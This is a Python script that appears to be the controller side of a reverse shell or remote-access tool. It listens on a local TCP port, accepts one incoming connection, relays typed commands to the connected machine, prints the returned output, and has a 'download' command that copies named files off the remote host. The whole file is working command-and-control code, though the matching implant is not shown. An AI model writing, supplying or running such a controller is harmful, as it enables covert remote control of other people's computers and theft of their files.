import socket


def connect():
    global s
    global host 
    global port
    global c
    global addr
    # create socket object
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    host = "127.0.0.1"
    port = 80
    #bind the socket to IP and Port
    s.bind((host, port))
    # listen for connections
    s.listen(5)
    print(f"Listening as {host}:{port} ...")
    # accept connection attemps
    c, addr = s.accept()
    print("Connection from",addr)

def listen():
    while True:
        cmd_str = input("user-$")
        cmd = cmd_str.encode("utf-8")
        if not cmd:
            continue
        c.send(cmd)
        if cmd_str == 'download':
            download()
            continue
        if cmd_str == 'q':
            break
        data = c.recv(4096).decode("utf-8")
        while "--complete--" not in str(data):
            print(str(data))
            data = c.recv(4096).decode("utf-8")
        
        data = str(data)
        data = data.replace("--complete--", "")
        print(data)

def close():
    c.close()

# download
def download():
    filename = input("filename-#")
    c.send(filename.encode("utf-8"))
    f = open(filename, 'wb')
    i = c.recv(4096)
    while '--complete--' not in str(i.decode("utf-8")):
        f.write(i)
        i = c.recv(4096)

    i = str(i.decode("utf-8"))
    i = i.replace("--complete--", "")
    f.write(i.encode("utf-8"))
    f.close()

def main():
    connect()
    listen()
    close()

main()